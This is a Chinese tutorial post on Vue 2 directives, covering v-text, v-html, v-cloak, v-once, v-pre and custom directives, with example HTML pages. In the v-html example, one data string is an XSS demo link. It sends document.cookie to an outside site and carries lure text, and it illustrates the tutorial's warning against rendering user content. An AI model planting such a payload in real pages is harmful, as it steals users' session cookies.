---
title: Vue指令
date: 2023/05/11
categories:
 - 前端
tags:
 - vue2.x
 - directive
 - v-clock
 - v-text
 - v-html
 - v-once
 - v-pre
---

## Vue内置指令

已经接触过的指令：
- v-bind	: 单向绑定解析表达式, 可简写为 :xxx
- v-model	: 双向数据绑定
- v-for  	: 遍历数组/对象/字符串
- v-on   	: 绑定事件监听, 可简写为@
- v-if 	 	: 条件渲染（动态控制节点是否存存在）
- v-else 	: 条件渲染（动态控制节点是否存存在）
- v-show 	: 条件渲染 (动态控制节点是否展示)

### v-text与v-html

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-text指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
            <!-- 
                v-text指令：
                    1. 作用：向其所在的节点中渲染文本内容。
                    2. 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
		    -->
			<div v-text="name"></div>

            <!-- 
				v-html指令：
                    1.作用：向指定节点中渲染包含html结构的内容。
                    2.与插值语法的区别：
                        (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
                        (2).v-html可以识别html结构。
                    3.严重注意：v-html有安全性问题！！！！
                        (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                        (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
		    -->
            <div v-text="name"></div>
            <div v-html="str"></div>
            <div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
                str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>
```

### v-cloak指令

v-cloak指令是**没有值**的
1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉`v-cloak`属性。
2. 使用css配合`v-cloak`可以解决网速慢时页面展示出`{{xxx}}`的问题。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
			[v-cloak]{
				display:none;
			}
		</style>
		<!-- 引入Vue -->
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	
	<script type="text/javascript">
		console.log(1)
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

### v-once指令

1. v-once所在节点在初次动态渲染后，就视为静态内容了。
2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-once指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
            <!-- 使用v-once修饰之后，渲染在页面上的这个n值，就是1，并且后续n更新，这个标签里的n也不会再改变 -->
			<h2 v-once>初始化的n值是:{{n}}</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				n: 1
			}
		})
	</script>
</html>
```

### v-pre指令

1. 跳过其所在节点的编译过程。
2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-pre指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
            <!-- 即使有插值模板的内容，被v-pre修饰了之后，仍旧不会被vue解析，在页面上就只展示原样：当前的n值是:{{n}} ，所以我们一般也不这么用-->
			<h2 v-pre>当前的n值是:{{n}}</h2>
            <!-- 一般可以在完全没有使用指令语法、没有使用插值语法的节点上加这个v-pre，跳过该节点的编译过程，加快编译 -->
            <h2 v-pre>Vue其实很简单</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```

## 自定义指令

1. 定义语法：
    - (1).局部指令：
        ```js
        new Vue({								new Vue({
            directives:{指令名:配置对象}   或   		directives{ 指令名:回调函数 }
        }) 										})
        ```
    - (2).全局指令：
        ```js
        Vue.directive(指令名,配置对象)  或   Vue.directive(指令名,回调函数)
        ```

2. 配置对象中常用的3个回调：
    - bind：指令与元素成功绑定时调用。
    - inserted：指令所在元素被插入页面时调用。
    - update：指令所在模板结构被重新解析时调用。

3. 备注：
    1. 指令定义时不加`v-`，但使用时要加`v-`；
    2. 指令名如果是多个单词，要使用`kebab-case`命名方式，不要用`camelCase`命名。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
            需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
            需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>{{name}}</h2>
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2>
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		//定义全局指令
		/* Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		}) */

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			directives:{
				// big函数何时会被调用？
                //   1.指令与元素成功绑定时（一上来）。
                //   2.指令所在的模板被重新解析时。
				'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, 
				big(element,binding){
					console.log('big',this) //注意此处的this是window
					// console.log('big')
					element.innerText = binding.value * 10
				},
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(element,binding){
						element.value = binding.value
					},
					//指令所在元素被插入页面时
					inserted(element,binding){
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value
					}
				}
			}
		})
	</script>
</html>
```

### 在获取焦点示例中回顾一个dom操作

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Document</title>
		<style>
			.demo{
				background-color: orange;
			}
		</style>
	</head>
	<body>
		<button id="btn">点我创建一个输入框</button>
		
		<script type="text/javascript" >
			const btn = document.getElementById('btn')
			btn.onclick = ()=>{
				const input = document.createElement('input')

				input.className = 'demo'
				input.value = 99
				input.onclick = ()=>{ alert(1) }
				// input.parentElement.style.backgroundColor = 'skyblue' // 这里是不生效的，因为都还没添加节点，怎么可能操作的到input框的父节点
				document.body.appendChild(input) 
				input.focus() // 节点挂载了之后，input才能正常获取到焦点
				// input.parentElement.style.backgroundColor = 'skyblue'
				console.log(input.parentElement)
			}
		</script>
	</body>
</html>
```
